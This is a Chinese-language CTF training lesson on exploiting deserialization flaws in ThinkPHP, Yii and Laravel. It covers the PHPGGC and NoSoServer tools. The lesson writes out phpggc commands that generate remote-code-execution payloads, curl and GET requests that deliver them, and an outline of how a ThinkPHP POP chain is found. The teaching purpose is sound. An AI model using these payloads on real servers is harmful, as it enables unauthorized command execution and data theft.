#  061：PHP框架反序列化漏洞利用与PHPGGC工具实战

![](img/c4ba44e408df6c460f91177db8a2db1e_1.png)

在本节课中，我们将学习PHP主流框架（如ThinkPHP、Yii、Laravel）中反序列化漏洞的利用方法。课程将重点介绍自动化利用工具PHPGGC，并通过CTF例题演示如何发现和利用这类漏洞。我们还将探讨漏洞的挖掘思路，帮助你理解框架类反序列化与原生代码反序列化的区别。

![](img/c4ba44e408df6c460f91177db8a2db1e_3.png)

---

## 📚 课程概述

反序列化漏洞在PHP安全中是一个重要议题。前期课程我们学习了原生PHP代码中的反序列化原理与利用。本节课将聚焦于**框架层面**的反序列化漏洞。

![](img/c4ba44e408df6c460f91177db8a2db1e_5.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_6.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_8.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_10.png)

框架类反序列化漏洞的核心代码位于框架内部，而非开发者自定义的代码中。这意味着利用这类漏洞需要深入了解框架的内部机制，其复杂程度远超原生PHP代码。因此，我们引入了**PHPGGC**这类自动化工具来辅助利用。

![](img/c4ba44e408df6c460f91177db8a2db1e_12.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_14.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_16.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_18.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_20.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_22.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_24.png)

## 🔧 核心工具介绍：PHPGGC与NoSoServer

![](img/c4ba44e408df6c460f91177db8a2db1e_26.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_28.png)

在深入利用之前，有必要了解两个关键项目。

![](img/c4ba44e408df6c460f91177db8a2db1e_30.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_32.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_34.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_36.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_38.png)

### NoSoServer项目

![](img/c4ba44e408df6c460f91177db8a2db1e_40.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_42.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_44.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_46.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_48.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_49.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_51.png)

这是一个集成化Web环境，将四种语言（Java、.NET、PHP、Python）的主流反序列化利用工具集合在一起。其PHP部分集成的正是**PHPGGC**工具。

![](img/c4ba44e408df6c460f91177db8a2db1e_53.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_55.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_57.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_59.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_61.png)

**项目地址**：`https://github.com/...` （此处省略具体地址，课程中已展示）

![](img/c4ba44e408df6c460f91177db8a2db1e_63.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_65.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_67.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_69.png)

它的作用是提供一个图形化界面，方便生成针对不同框架和组件的反序列化利用载荷（Payload）。

![](img/c4ba44e408df6c460f91177db8a2db1e_71.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_73.png)

### PHPGGC工具

![](img/c4ba44e408df6c460f91177db8a2db1e_75.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_77.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_79.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_81.png)

PHPGGC是专门针对PHP语言开发的CMS和框架的反序列化漏洞利用生成工具。

![](img/c4ba44e408df6c460f91177db8a2db1e_83.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_85.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_87.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_89.png)

**它的定位是解决框架类反序列化链（POP链）过于复杂、手工构造困难的问题**。它预置了众多已知漏洞的利用链，支持ThinkPHP、Yii、Laravel、WordPress等主流系统。

![](img/c4ba44e408df6c460f91177db8a2db1e_91.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_93.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_95.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_96.png)

**基本用法**：
```bash
# 列出所有支持的漏洞利用链
phpggc -l

![](img/c4ba44e408df6c460f91177db8a2db1e_98.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_99.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_101.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_103.png)

# 生成特定利用链的Payload
phpggc ThinkPHP/RCE1 system "cat /flag" --base64
```
**参数说明**：
*   `-l`: 列出所有可用的利用链。
*   `ThinkPHP/RCE1`: 指定要使用的漏洞利用链名称。
*   `system “cat /flag”`: 指定最终要执行的函数和命令。
*   `--base64`: 对生成的Payload进行Base64编码（根据目标代码是否需要解码而定）。

![](img/c4ba44e408df6c460f91177db8a2db1e_105.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_107.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_109.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_111.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_113.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_115.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_117.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_119.png)

## 🎯 实战案例：CTF题型演示

![](img/c4ba44e408df6c460f91177db8a2db1e_121.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_123.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_125.png)

下面我们通过三个CTF例题，分别演示ThinkPHP、Yii和Laravel框架反序列化漏洞的利用流程。

![](img/c4ba44e408df6c460f91177db8a2db1e_127.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_129.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_131.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_133.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_135.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_137.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_139.png)

### 案例一：ThinkPHP 6.0 反序列化

![](img/c4ba44e408df6c460f91177db8a2db1e_141.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_143.png)

**题目背景**：题目是一个ThinkPHP 6.0搭建的站点，通过扫描发现源码压缩包。在源码的控制器中，发现存在`unserialize($_POST[‘data’])`的代码，且没有明显的过滤。

![](img/c4ba44e408df6c460f91177db8a2db1e_145.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_147.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_149.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_151.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_153.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_155.png)

**利用步骤**：
1.  **信息收集**：确认框架为ThinkPHP，版本为6.0.x。
2.  **工具选择**：使用PHPGGC查找适用于ThinkPHP 6.0的RCE利用链。
    ```bash
    phpggc -l | grep ThinkPHP
    ```
    发现`ThinkPHP/RCE3`和`ThinkPHP/RCE4`适用于该版本。
3.  **生成Payload**：选择其中一个链生成执行命令的Payload。
    ```bash
    phpggc ThinkPHP/RCE3 system “cat /flag” –urlencode
    ```
4.  **发送Payload**：将生成的Payload通过POST请求发送到存在`unserialize`的端点。
    ```bash
    curl -X POST http://target.com/index.php –data “data=<生成的Payload>”
    ```
5.  **获取结果**：成功执行命令并获取flag。

![](img/c4ba44e408df6c460f91177db8a2db1e_157.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_159.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_161.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_163.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_165.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_167.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_169.png)

**关键点**：对于框架类漏洞，**必须有源码参考**才能知道触发点在哪里。黑盒测试很难直接发现此类漏洞。

![](img/c4ba44e408df6c460f91177db8a2db1e_171.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_173.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_174.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_176.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_178.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_180.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_182.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_184.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_186.png)

### 案例二：Yii 2.0 反序列化

![](img/c4ba44e408df6c460f91177db8a2db1e_188.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_190.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_192.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_194.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_196.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_198.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_200.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_202.png)

**题目背景**：题目通过源码泄露提示存在Yii 2.0框架，并在`/backshell`路径下存在`unserialize(base64_decode($_GET[‘code’]))`的代码。

![](img/c4ba44e408df6c460f91177db8a2db1e_204.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_206.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_208.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_210.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_212.png)

**利用步骤**：
1.  **确认环境**：通过前端引用的JS文件等线索，确认框架为Yii 2.0。
2.  **生成Payload**：使用PHPGGC生成Yii 2.0的利用链Payload。由于代码会进行Base64解码，我们需要生成Base64编码后的Payload。
    ```bash
    phpggc Yii2/RCE1 system “cp /flag /tmp/flag.txt” –base64
    ```
    *这里使用文件复制命令是因为某些环境可能无回显，将结果写入文件再访问查看。*
3.  **发送Payload**：以GET方式将`code`参数提交到目标地址。
    ```
    http://target.com/backshell?code=<Base64编码后的Payload>
    ```
4.  **查看结果**：访问`/tmp/flag.txt`（或Web目录下的相应文件）获取命令执行结果。

![](img/c4ba44e408df6c460f91177db8a2db1e_214.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_216.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_218.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_220.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_222.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_224.png)

### 案例三：Laravel 反序列化

![](img/c4ba44e408df6c460f91177db8a2db1e_226.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_228.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_230.png)

**题目背景**：题目直接给出源码，在路由中定义了POST请求处理函数，其中包含`unserialize($_POST[‘data’])`。

![](img/c4ba44e408df6c460f91177db8a2db1e_232.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_234.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_236.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_238.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_240.png)

**利用步骤**：
1.  **版本确认**：在源码中查找Laravel的版本信息（如`composer.json`）。
2.  **选择利用链**：使用PHPGGC查找适用于该版本的Laravel反序列化链。由于版本未知，可能需要尝试多个。
    ```bash
    phpggc -l | grep Laravel
    ```
3.  **生成并测试**：选择一个可能适用的链（如`Laravel/RCE1`）生成Payload进行测试。
    ```bash
    phpggc Laravel/RCE1 system “ls -la” –urlencode
    ```
4.  **发送请求**：将Payload通过POST的`data`字段提交。
5.  **获取回显**：成功执行`ls`命令，列出当前目录文件。

![](img/c4ba44e408df6c460f91177db8a2db1e_242.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_243.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_245.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_247.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_249.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_251.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_253.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_255.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_257.png)

## 🕵️ 漏洞挖掘思路分析

![](img/c4ba44e408df6c460f91177db8a2db1e_259.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_261.png)

上一节我们演示了如何利用已知漏洞。本节中，我们来探讨一下这类漏洞是如何被挖掘出来的。

![](img/c4ba44e408df6c460f91177db8a2db1e_263.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_265.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_267.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_269.png)

框架类反序列化漏洞的挖掘分为两个层面：

![](img/c4ba44e408df6c460f91177db8a2db1e_271.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_273.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_275.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_277.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_279.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_281.png)

### 层面一：在已知框架漏洞基础上挖掘CMS漏洞

![](img/c4ba44e408df6c460f91177db8a2db1e_283.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_285.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_287.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_289.png)

这是相对容易的层面。当你审计一个使用ThinkPHP、Yii等框架开发的CMS时：
1.  首先确定CMS所使用的框架及版本。
2.  查阅资料，确认该框架版本是否存在已知的反序列化漏洞。
3.  **最关键的一步**：在CMS的源码中全局搜索`unserialize`函数，寻找可控的触发点。
4.  如果找到触发点，且框架版本存在漏洞，那么就可以使用PHPGGC生成Payload进行利用。

![](img/c4ba44e408df6c460f91177db8a2db1e_291.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_293.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_295.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_297.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_299.png)

**这相当于站在“巨人”（框架漏洞发现者）的肩膀上，去挖掘具体应用系统的漏洞。**

![](img/c4ba44e408df6c460f91177db8a2db1e_301.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_303.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_305.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_307.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_309.png)

### 层面二：挖掘框架本身的零日漏洞

![](img/c4ba44e408df6c460f91177db8a2db1e_311.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_313.png)

这是难度最高的层面，需要具备深厚的开发功底和对框架源码的深刻理解。以ThinkPHP 5.0.24反序列化漏洞的挖掘为例，其大致流程如下：

![](img/c4ba44e408df6c460f91177db8a2db1e_315.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_317.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_319.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_321.png)

1.  **寻找入口点**：在框架源码中搜索所有可能的魔术方法（如`__destruct`, `__wakeup`），这些是反序列化链的起点。
2.  **回溯调用链**：从某个`__destruct`方法开始，分析其调用的其他方法。例如，发现`__destruct`中调用了`removeFiles`方法。
3.  **寻找敏感操作**：在`removeFiles`方法中，发现其对一个属性进行了`file_exists`判断。如果该属性是对象，则会触发其`__toString`方法。
4.  **链式传递**：接着分析`__toString`方法，它可能调用了`toJson`，进而调用`__call`（当调用不存在的方法时触发）。
5.  **抵达危险函数**：最终在`__call`方法中，找到了可以控制`call_user_func`或`call_user_func_array`函数参数的点，从而实现任意代码执行。
6.  **构造POP链**：将上述所有环节涉及的类属性精心构造，串联成一条完整的、从反序列化触发到命令执行的调用链。

![](img/c4ba44e408df6c460f91177db8a2db1e_323.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_325.png)

这个过程需要对框架的命名空间、类结构、方法调用有非常清晰的了解，并且要遍历大量代码，排除无效路径。**这远非一朝一夕可以掌握，通常需要多年的PHP开发经验和对安全研究的热情。**

![](img/c4ba44e408df6c460f91177db8a2db1e_327.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_329.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_330.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_332.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_334.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_336.png)

## 💻 环境搭建补充：NoSoServer

![](img/c4ba44e408df6c460f91177db8a2db1e_338.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_340.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_342.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_344.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_346.png)

有同学提到NoSoServer项目的搭建问题，这里进行简要说明。

**搭建步骤**：
1.  **准备环境**：一台Windows Server 2012 R2或更高版本的服务器，安装IIS。
2.  **安装依赖**：在IIS中安装**应用程序开发**功能，确保勾选`.NET 4.5`或更高版本。
3.  **部署源码**：将NoSoServer项目源码解压到IIS的网站目录（如`C:\inetpub\wwwroot\nososervertest`）。
4.  **配置IIS**：
    *   在IIS管理器中添加网站，物理路径指向源码目录。
    *   将该网站应用程序池的**.NET CLR版本**设置为`v4.0`或更高。
5.  **设置权限**：给予源码目录`IIS_IUSRS`用户组**完全控制**权限，以解决可能的500错误。
6.  **访问测试**：通过浏览器访问`http://your-ip:port`即可看到集成界面。

![](img/c4ba44e408df6c460f91177db8a2db1e_348.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_350.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_352.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_354.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_356.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_358.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_360.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_362.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_364.png)

**注意**：NoSoServer的PHPGGC Web功能可能需要在Linux环境下运行PHPGGC脚本，Windows IIS环境可能无法直接使用该功能生成PHP的Payload。但Java、.NET、Python部分通常正常。

![](img/c4ba44e408df6c460f91177db8a2db1e_366.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_368.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_369.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_371.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_373.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_375.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_377.png)

---

![](img/c4ba44e408df6c460f91177db8a2db1e_379.png)

## 📝 课程总结

![](img/c4ba44e408df6c460f91177db8a2db1e_381.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_383.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_385.png)

本节课我们一起学习了PHP框架反序列化漏洞的利用与相关知识：

![](img/c4ba44e408df6c460f91177db8a2db1e_387.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_389.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_390.png)

1.  **核心概念**：框架类反序列化漏洞利用的是框架内部封装的代码链，复杂度高，通常需要借助自动化工具。
2.  **核心工具**：**PHPGGC**是PHP框架反序列化利用的“瑞士军刀”，可以一键生成针对多种框架和版本的攻击Payload。
3.  **利用流程**：发现反序列化触发点 -> 识别框架及版本 -> 使用PHPGGC生成对应Payload -> 发送Payload执行命令。
4.  **挖掘层次**：
    *   **初级/实战**：在已知框架漏洞基础上，审计具体CMS/应用，寻找可控的`unserialize`点进行利用。
    *   **高级/研究**：深入分析框架源码，挖掘框架本身的零日反序列化漏洞，这需要极强的开发能力和代码审计功底。
5.  **环境搭建**：掌握了NoSoServer集成环境的搭建方法，便于图形化生成多种语言的反序列化Payload。

![](img/c4ba44e408df6c460f91177db8a2db1e_392.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_394.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_396.png)

![](img/c4ba44e408df6c460f91177db8a2db1e_398.png)

通过本课的学习，你应当能够应对CTF中常见的框架反序列化题目，并具备在实战中审计使用已知漏洞框架的CMS的基本能力。要迈向挖掘框架底层漏洞的层次，则需要持续深耕PHP开发与代码审计技术。